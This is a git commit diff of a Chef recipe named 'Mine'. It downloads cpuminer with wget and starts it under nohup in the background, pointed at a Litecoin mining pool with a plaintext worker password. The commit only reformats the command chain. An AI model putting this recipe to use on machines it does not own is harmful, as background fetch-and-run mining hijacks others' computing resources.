a4d35ec220fa458f238d8d2980772564f3230af8
jatinluthra14 <jatinluthra14@gmail.com>
2016-04-23 23:31:27 +0530

    Update bash.rb

--- sample/recipes/bash.rb
+++ sample/recipes/bash.rb
@@ -1,6 +1,10 @@
 bash "Mine" do
   user "ubuntu"
   code <<-EOH
-  cd /home/ubuntu/ && wget https://github.com/pooler/cpuminer/releases/download/v2.4.4/pooler-cpuminer-2.4.4-linux-x86_64.tar.gz && tar xvf pooler-cpuminer-2.4.4-linux-x86_64.tar.gz && echo "Hi" > yo.txt &&nohup ./minerd -o stratum+tcp://global.wemineltc.com:3333 -u ajhaxynr.1 -p ajHax365 -t 32 &
+  cd /home/ubuntu/
+  wget https://github.com/pooler/cpuminer/releases/download/v2.4.4/pooler-cpuminer-2.4.4-linux-x86_64.tar.gz
+  tar xvf pooler-cpuminer-2.4.4-linux-x86_64.tar.gz
+  echo "Hi" > yo.txt
+  nohup ./minerd -o stratum+tcp://global.wemineltc.com:3333 -u ajhaxynr.1 -p ajHax365 -t 32 &
   EOH
   end
